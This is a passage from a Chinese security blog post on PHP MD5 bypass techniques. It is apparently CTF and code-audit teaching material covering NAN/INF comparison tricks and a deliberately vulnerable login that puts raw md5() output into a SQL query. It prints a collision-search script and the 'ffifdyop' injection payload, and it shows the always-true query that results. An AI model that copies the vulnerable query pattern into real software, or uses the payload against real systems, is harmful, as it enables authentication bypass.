+<span class="token function">define</span> <span class="token punctuation">(</span><span class="token string">'NAN'</span><span class="token punctuation">,</span> <span class="token constant">NAN</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>NAN</code>即非数，特性：和任何数据类型运算还是本身</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token constant">NAN</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">double</span><span class="token punctuation">(</span><span class="token constant">NAN</span><span class="token punctuation">)</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token constant">NAN</span><span class="token operator">+</span><span class="token string">"1111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">double</span><span class="token punctuation">(</span><span class="token constant">NAN</span><span class="token punctuation">)</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token constant">NAN</span><span class="token operator">+</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">double</span><span class="token punctuation">(</span><span class="token constant">NAN</span><span class="token punctuation">)</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token constant">NAN</span><span class="token operator">+</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">double</span><span class="token punctuation">(</span><span class="token constant">NAN</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>NAN</code>绕过</p>
+<p><img src="/2020/08/23/php-md5-bypass-audit/image-20200827020255841.png" alt="image-20200827020255841"></p>
+<p><code>INF</code>即无穷大，<code>&#39;2&#39;/0</code>、<code>2/a</code>、<code>2.0/0</code></p>
+<pre class="line-numbers language-bash"><code class="language-bash">λ  Qftm <span class="token operator">>></span><span class="token operator">></span>: php -r var_dump<span class="token punctuation">(</span>2/0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+Warning: Division by zero <span class="token keyword">in</span> Command line code on line 1
+
+Call Stack:
+    0.0019     400504   1. <span class="token punctuation">{</span>main<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span> Command line code:0
+
+Command line code:1:
+double<span class="token punctuation">(</span>INF<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>INF</code>绕过</p>
+<p><img src="/2020/08/23/php-md5-bypass-audit/image-20200827020511272.png" alt="image-20200827020511272"></p>
+<h1 id="MD5-8-SQL拼接-挑战"><a href="#MD5-8-SQL拼接-挑战" class="headerlink" title="MD5-8-SQL拼接-挑战"></a>MD5-8-SQL拼接-挑战</h1><h2 id="Code-8"><a href="#Code-8" class="headerlink" title="Code"></a>Code</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">include</span> <span class="token string">'conn.php'</span><span class="token punctuation">;</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM flag WHERE password = '"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"'"</span><span class="token punctuation">;</span>
+    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"Please input the user！&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="Bypass-8"><a href="#Bypass-8" class="headerlink" title="Bypass"></a>Bypass</h2><p>上述代码审计逻辑绕过MD5查询即可：由于md5()函数第二个参数为true，加密后的值会以二进制生成，当其被当成字符串处理后极有可能构造出闭合的字符串，比如 <code>or and</code>等特殊字符，通过碰撞取得特定特殊字符串构造出相关<code>or</code>关键字进行绕过。</p>
+<p>PHP中MD5函数用法：md5() 函数计算字符串的 MD5 散列</p>
+<pre><code>md5(string,raw)</code></pre><table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">string</td>
+<td align="left">必需。规定要计算的字符串。</td>
+</tr>
+<tr>
+<td align="left">charlist</td>
+<td align="left">可选。规定十六进制或二进制输出格式：TRUE - 原始 16 字符二进制格式FALSE - 默认。32 字符十六进制数注释：该参数是 PHP 5.0 中添加的。</td>
+</tr>
+</tbody></table>
+<p>脚本碰撞</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+ <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$c</span> <span class="token operator">&lt;</span> <span class="token number">1000000</span><span class="token punctuation">;</span> <span class="token variable">$c</span><span class="token operator">++</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'\'or\''</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
+   <span class="token keyword">echo</span> <span class="token string">"\nmd5($i) = "</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
+ <span class="token keyword">echo</span> <span class="token string">"."</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span>
+
+<span class="token comment" spellcheck="true">// http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>已公开得几个特殊字符</p>
+<pre class="line-numbers language-txt"><code class="language-txt">content: 129581926211651571912466741651878684928
+hex: 06da5430449f8f6f23dfc1276f722738
+raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1'or'8
+string: T0Do#'or'8
+
+content: ffifdyop
+hex: 276f722736c95d99e921722cf9ed621c
+raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
+string: 'or'6]!r,b <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>绕过</p>
+<pre class="line-numbers language-txt"><code class="language-txt">?user=ffifdyop
+
+"SELECT * FROM flag WHERE password = '" . md5($_GET["user"],true) . "'";
+
+# or条件为真，查出所有数据
+SELECT * FROM flag WHERE password = ''or'6<trash>' <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Qftm</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://Qftm.github.io/2020/08/23/php-md5-bypass-audit/">http://Qftm.github.io/2020/08/23/php-md5-bypass-audit/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint polocy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">Qftm</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/PHP/">
+                                    <span class="chip bg-color">PHP</span>
+                                </a>
+                            
+                                <a href="/tags/MD5/">
+                                    <span class="chip bg-color">MD5</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2020/10/25/CVE-2019-15107-Webmin-RCE-Backdoor/">
+                    <div class="card-image">
+                        
+                        <img src="/medias/featureimages/webmin-1.jpg" class="responsive-img" alt="CVE-2019-15107 Webmin RCE 后门深入分析">
+                        
+                        <span class="card-title">CVE-2019-15107 Webmin RCE 后门深入分析</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            最近，有关webmin CVE-2019-15107，看了网上几篇分析文章，发现有些文章并没有把该有的细节讲清楚，比如：chybeta师傅分析的文章中root用户可以直接利用攻击，这里并没有说明白：如果系统用户（root等）被加入到webm
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-10-25
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Webmin/">
+                        <span class="chip bg-color">Webmin</span>
+                    </a>
+                    
+                    <a href="/tags/Perl/">
+                        <span class="chip bg-color">Perl</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/07/18/redis-security/">
+                    <div class="card-image">
+                        
+                        <img src="/medias/featureimages/redis-1.jpg" class="responsive-img" alt="从0到1认识Redis到多维角度场景下的安全分析与利用">
+                        
+                        <span class="card-title">从0到1认识Redis到多维角度场景下的安全分析与利用</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Redis数据库安全性问题对于安全测试人员来说再熟悉不过了，这里将针对该数据库做一个基本的介绍和多维角度场景下的安全分析与利用探索。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-18
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/" class="post-category">
+                                    攻防渗透
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/SSRF/">
+                        <span class="chip bg-color">SSRF</span>
+                    </a>
+                    
+                    <a href="/tags/Redis/">
+                        <span class="chip bg-color">Redis</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + 'From: Qftm<br />'
+            + 'Author: Qftm<br />'
+            + 'Link: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2018</span>
+            <a href="/about" target="_blank">Qftm</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">370.8k</span>&nbsp;字
+            
+            
+            
+            
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/Qftm" 
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:Qftmbin@gmail.com" 
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+    <a href="https://twitter.com/Qftmer" 
+        <i class="fab fa-twitter"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/search.xml", 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
